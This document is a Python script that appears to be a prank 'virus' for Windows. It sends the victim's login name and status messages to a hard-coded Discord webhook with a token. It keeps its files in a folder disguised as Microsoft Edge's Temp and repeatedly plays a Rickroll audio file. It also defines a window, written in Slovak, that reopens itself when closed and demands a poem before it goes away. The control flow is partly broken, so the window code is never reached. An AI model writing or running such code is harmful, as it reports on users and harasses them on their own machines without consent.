import os, requests
import time
timestamp = time.time()
home_dir = os.path.expanduser("~")
appdata = os.environ['APPDATA']
shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
virus_dir = os.path.join(
    appdata, 
    "Microsoft", 
    "Edge", 
    "Temp"
)

def log_to_discord(msg:str):
    data = {"username":f"User:{os.getlogin()}", "content":msg}
    try:
        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
    except:
        print("Failed to send port request")
        
def open_window(delay = 0):
    global timestamp
    time.sleep(delay)
    log_to_discord(f"Opening window...\n{time.time() - timestamp}s from start.")
    import tkinter as tk
    root = tk.Tk()
    root.title("GAMA Halloween")
    canvas = tk.Canvas(root, width=800,height=600,bg="skyblue")
    canvas.pack()
    points = [(250, 150), (300, 500), (500, 200)]
    canvas.create_rectangle(points[0], points[1], fill='red', outline="red")
    canvas.create_rectangle(points[2], points[0], fill='red', outline="red")
    canvas.create_text(400, 550, text="Ak sa chcete zbaviť tohto okna, napíšte nám básničku do súboru v Desktop/vzdavam_sa.txt (aspoň jedna strofa).", fill="green")
    root.bind("<Destroy>", lambda event: open_window(delay = 60))
    root.mainloop()

def start():
    global timestamp
    chnapik_duration = 2*60+10
    
    import os
    try:
        from multiprocessing import Process
        def music_func():
            log_to_discord("Starting music loop...")
        while True:
            log_to_discord("Playing music...")
            os.system(f'start "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
            time.sleep(chnapik_duration)

            time.sleep(10 * 60) # 10 min delay 
            music = Process(target=music_func)
            music.start() 
    except Exception as e:
        # Windows is weird
        log_to_discord(f"Windows is being weird, music didnt start, error: {e}")

    open_window()


if __name__ == "__main__":
    start()
